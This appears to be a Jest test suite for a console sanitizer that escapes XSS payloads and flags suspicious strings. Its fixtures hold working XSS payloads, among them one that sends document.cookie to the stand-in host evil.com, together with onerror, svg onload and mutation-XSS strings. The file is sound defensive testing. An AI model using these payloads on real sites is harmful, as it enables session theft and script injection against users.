/**
 * Console XSS Prevention Tests
 * P08-T009: CRITICAL security tests for console sanitizer
 *
 * Tests that console messages are properly sanitized to prevent:
 * - XSS attacks via malicious console.log content
 * - Code injection in terminal output
 * - HTML entity exploitation
 */

import {
  sanitizeConsoleMessage,
  formatForTerminal,
  containsPotentialXSS,
  SanitizedConsoleMessage,
} from '../../security/console-sanitizer';

describe('Console XSS Prevention', () => {
  describe('sanitizeConsoleMessage', () => {
    it('should sanitize basic XSS attack in string argument', () => {
      const malicious = {
        type: 'console:log',
        level: 'log',
        args: ['<script>alert("XSS")</script>'],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();
      expect(sanitized!.args[0]).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
      expect(sanitized!.sanitized).toBe(true);
    });

    it('should sanitize XSS in object properties', () => {
      const malicious = {
        type: 'console:log',
        level: 'log',
        args: [
          {
            name: '<img src=x onerror=alert(1)>',
            value: 'test',
          },
        ],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();

      // Values should be sanitized (key "name" contains XSS)
      const arg = sanitized!.args[0] as any;
      expect(arg.name).toContain('&lt;img');
      expect(arg.name).toContain('&#x3D;');
      expect(arg.name).not.toContain('<img');
      expect(arg.value).toBe('test');
    });

    it('should sanitize XSS in nested objects', () => {
      const malicious = {
        type: 'console:log',
        level: 'log',
        args: [
          {
            user: {
              name: '<script>alert("nested")</script>',
            },
          },
        ],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();

      const arg = sanitized!.args[0] as any;
      expect(arg.user.name).toBe('&lt;script&gt;alert(&quot;nested&quot;)&lt;&#x2F;script&gt;');
    });

    it('should sanitize XSS in arrays', () => {
      const malicious = {
        type: 'console:log',
        level: 'log',
        args: [['<script>alert(1)</script>', 'safe', '<img src=x onerror=alert(2)>']],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();

      const arr = sanitized!.args[0] as string[];
      expect(arr[0]).toBe('&lt;script&gt;alert(1)&lt;&#x2F;script&gt;');
      expect(arr[1]).toBe('safe');
      expect(arr[2]).toBe('&lt;img src&#x3D;x onerror&#x3D;alert(2)&gt;');
    });

    it('should sanitize error messages', () => {
      const malicious = {
        type: 'console:error',
        level: 'error',
        args: [
          {
            __type: 'error',
            message: '<script>alert("XSS")</script>',
            stack: 'at <script>alert()</script>',
            name: 'Error',
          },
        ],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();

      const err = sanitized!.args[0] as any;
      expect(err.__type).toBe('error');
      expect(err.message).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
      expect(err.stack).toBe('at &lt;script&gt;alert()&lt;&#x2F;script&gt;');
    });

    it('should sanitize DOM element references', () => {
      const malicious = {
        type: 'console:log',
        level: 'log',
        args: [
          {
            __type: 'element',
            tagName: '<script>',
            id: 'alert(1)',
            className: 'onclick="alert(2)"',
          },
        ],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();

      const elem = sanitized!.args[0] as any;
      expect(elem.__type).toBe('element');
      expect(elem.tagName).toBe('&lt;script&gt;');
      expect(elem.id).toBe('alert(1)');
      expect(elem.className).toBe('onclick&#x3D;&quot;alert(2)&quot;');
    });

    it('should sanitize URL field', () => {
      const malicious = {
        type: 'console:log',
        level: 'log',
        args: ['test'],
        timestamp: new Date().toISOString(),
        url: 'javascript:alert("XSS")',
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();
      expect(sanitized!.url).toBe('javascript:alert(&quot;XSS&quot;)');
    });

    it('should reject invalid message format', () => {
      const invalid = {
        type: 'not-console',
        level: 'log',
        args: ['test'],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(invalid);
      expect(sanitized).toBeNull();
    });

    it('should reject message with invalid level', () => {
      const invalid = {
        type: 'console:log',
        level: 'invalid-level',
        args: ['test'],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(invalid);
      expect(sanitized).toBeNull();
    });

    it('should reject message with non-array args', () => {
      const invalid = {
        type: 'console:log',
        level: 'log',
        args: 'not-an-array',
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(invalid);
      expect(sanitized).toBeNull();
    });

    it('should handle all HTML entities correctly', () => {
      const malicious = {
        type: 'console:log',
        level: 'log',
        args: ['& < > " \' / ` ='],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(malicious);
      expect(sanitized).not.toBeNull();
      expect(sanitized!.args[0]).toBe('&amp; &lt; &gt; &quot; &#x27; &#x2F; &#x60; &#x3D;');
    });

    it('should preserve safe content', () => {
      const safe = {
        type: 'console:log',
        level: 'log',
        args: ['Hello, world!', 123, true, null, { key: 'value' }],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(safe);
      expect(sanitized).not.toBeNull();
      expect(sanitized!.args[0]).toBe('Hello, world!');
      expect(sanitized!.args[1]).toBe(123);
      expect(sanitized!.args[2]).toBe(true);
      expect(sanitized!.args[3]).toBe(null);
    });
  });

  describe('formatForTerminal', () => {
    it('should format sanitized message safely', () => {
      const sanitized: SanitizedConsoleMessage = {
        type: 'console:log',
        level: 'log',
        args: ['&lt;script&gt;alert()&lt;&#x2F;script&gt;'],
        timestamp: new Date().toISOString(),
        sanitized: true,
      };

      const formatted = formatForTerminal(sanitized);
      expect(formatted).toContain('[LOG]');
      expect(formatted).toContain('&lt;script&gt;');
      expect(formatted).not.toContain('<script>');
    });

    it('should format error messages with stack traces', () => {
      const sanitized: SanitizedConsoleMessage = {
        type: 'console:error',
        level: 'error',
        args: [
          {
            __type: 'error',
            message: 'Test error',
            stack: 'at test.js:1:1',
            name: 'Error',
          },
        ],
        timestamp: new Date().toISOString(),
        sanitized: true,
      };

      const formatted = formatForTerminal(sanitized);
      expect(formatted).toContain('[ERROR]');
      expect(formatted).toContain('Error: Test error');
    });
  });

  describe('containsPotentialXSS', () => {
    it('should detect script tags', () => {
      expect(containsPotentialXSS('<script>alert(1)</script>')).toBe(true);
      expect(containsPotentialXSS('<SCRIPT>alert(1)</SCRIPT>')).toBe(true);
    });

    it('should detect javascript: URLs', () => {
      expect(containsPotentialXSS('javascript:alert(1)')).toBe(true);
      expect(containsPotentialXSS('JAVASCRIPT:alert(1)')).toBe(true);
    });

    it('should detect event handlers', () => {
      expect(containsPotentialXSS('onerror=alert(1)')).toBe(true);
      expect(containsPotentialXSS('onclick=alert(1)')).toBe(true);
      expect(containsPotentialXSS('onload=alert(1)')).toBe(true);
    });

    it('should detect iframe tags', () => {
      expect(containsPotentialXSS('<iframe src="evil.com"></iframe>')).toBe(true);
    });

    it('should detect eval calls', () => {
      expect(containsPotentialXSS('eval(malicious_code)')).toBe(true);
    });

    it('should detect alert calls', () => {
      expect(containsPotentialXSS('alert(1)')).toBe(true);
    });

    it('should not flag safe content', () => {
      expect(containsPotentialXSS('Hello, world!')).toBe(false);
      expect(containsPotentialXSS('function test() { return 42; }')).toBe(false);
      expect(containsPotentialXSS('const x = 123;')).toBe(false);
    });
  });

  describe('Real-world XSS attack vectors', () => {
    it('should block DOM-based XSS', () => {
      const attack = {
        type: 'console:log',
        level: 'log',
        args: ['<img src=x onerror=alert(document.cookie)>'],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(attack);
      expect(sanitized).not.toBeNull();

      // The string should be escaped, not contain actual HTML
      expect(sanitized!.args[0]).toContain('&lt;img');
      expect(sanitized!.args[0]).toContain('&gt;');
      expect(sanitized!.args[0]).not.toContain('<img');
    });

    it('should block stored XSS', () => {
      const attack = {
        type: 'console:log',
        level: 'log',
        args: ['<script>fetch("http://evil.com?cookie="+document.cookie)</script>'],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(attack);
      expect(sanitized).not.toBeNull();
      expect(containsPotentialXSS(sanitized!.args[0] as string)).toBe(false);
    });

    it('should block reflected XSS', () => {
      const attack = {
        type: 'console:log',
        level: 'log',
        args: ['<svg/onload=alert(1)>'],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(attack);
      expect(sanitized).not.toBeNull();

      // Should be escaped
      expect(sanitized!.args[0]).toContain('&lt;svg');
      expect(sanitized!.args[0]).toContain('&gt;');
      expect(sanitized!.args[0]).not.toContain('<svg');
    });

    it('should block mutation XSS', () => {
      const attack = {
        type: 'console:log',
        level: 'log',
        args: ['<math><mi//xlink:href="data:x,<script>alert(1)</script>">'],
        timestamp: new Date().toISOString(),
      };

      const sanitized = sanitizeConsoleMessage(attack);
      expect(sanitized).not.toBeNull();

      // Should be escaped
      expect(sanitized!.args[0]).toContain('&lt;math&gt;');
      expect(sanitized!.args[0]).toContain('&lt;script&gt;');
      expect(sanitized!.args[0]).not.toContain('<math>');
      expect(sanitized!.args[0]).not.toContain('<script>');
    });
  });
});
